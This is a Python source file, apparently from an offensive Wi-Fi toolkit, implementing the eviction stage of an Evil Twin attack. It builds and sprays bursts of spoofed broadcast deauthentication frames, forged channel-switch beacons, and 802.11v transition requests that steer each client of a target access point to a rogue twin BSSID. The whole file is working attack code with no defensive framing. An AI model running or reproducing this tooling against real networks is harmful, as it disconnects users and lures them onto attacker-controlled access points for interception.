"""Punter: injects the EvilTwin eviction frames (broadcast deauth, CSA beacon, per-client 802.11v
BTM) on a given interface. Inject-only (no RX, no MAC); one burst per ``punt`` call, the campaign
owns the cadence."""
from __future__ import annotations

import asyncio
import enum
from typing import Iterable, Sequence

from wifit3.dot11 import build_deauth
from wifit3.dot11.csa import build_csa_beacon
from wifit3.dot11.btm import build_btm_request

BURST_SIZE = 16
FRAME_GAP_SEC = 0.002
_BROADCAST = b"\xff\xff\xff\xff\xff\xff"
_DEAUTH_REASON = 7                               # class-3 frame from a nonassociated STA


class PuntMode(enum.Enum):
    DEAUTH = "deauth"
    CSA = "csa"
    BTM = "btm"


class Punter:
    def __init__(self, modes: Iterable[PuntMode], real_beacon: bytes, target_bssid: bytes,
                 csa_channel: int, twin_bssid: bytes, twin_channel: int, source_channel: int):
        self.modes = tuple(modes)
        self._deauth = build_deauth(_BROADCAST, target_bssid, target_bssid, _DEAUTH_REASON)
        self._csa = build_csa_beacon(real_beacon, csa_channel, from_channel=source_channel)
        self._target_bssid = target_bssid
        self._twin_bssid = twin_bssid
        self._twin_channel = twin_channel

    def _frames(self, clients: Sequence[bytes]) -> list[bytes]:
        frames: list[bytes] = []
        if PuntMode.DEAUTH in self.modes:
            frames.append(self._deauth)
        if PuntMode.CSA in self.modes:
            frames.append(self._csa)
        if PuntMode.BTM in self.modes:                          # unicast: one steer per client
            frames += [build_btm_request(c, self._target_bssid, self._target_bssid,
                                         candidate_bssid=self._twin_bssid,
                                         candidate_channel=self._twin_channel) for c in clients]
        return frames

    async def punt(self, iface, clients: Sequence[bytes] = ()) -> None:
        """Spray one burst of every enabled technique on ``iface``."""
        for frame in self._frames(clients):
            for _ in range(BURST_SIZE):
                await iface.send_no_wait(frame)
                await asyncio.sleep(FRAME_GAP_SEC)
